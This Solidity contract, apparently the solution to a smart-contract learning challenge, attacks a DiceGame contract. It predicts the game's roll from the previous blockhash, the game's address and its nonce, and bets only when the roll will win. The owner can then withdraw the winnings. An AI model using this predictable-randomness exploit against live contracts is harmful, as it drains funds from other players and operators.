// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable  {
    DiceGame public diceGame;

    constructor(address _diceGameAddress) {
        diceGame = DiceGame(payable(_diceGameAddress));
    }

    receive() external payable {}

    function riggedRoll() public payable {
        require(address(this).balance >= 0.002 ether, "Insufficient balance.");
        
        uint256 predictedRoll = predictRandomness();

        // Only roll if the predicted outcome is a winner
        if (predictedRoll < 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert("Predicted roll is not a winning roll.");
        }
    }

    function predictRandomness() internal view returns (uint256) {
        uint256 nonce = diceGame.nonce();
        return uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), nonce))) % 16;
    }

    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        require(address(this).balance >= _amount, "Insufficient funds.");
        payable(_addr).transfer(_amount);
    }
}
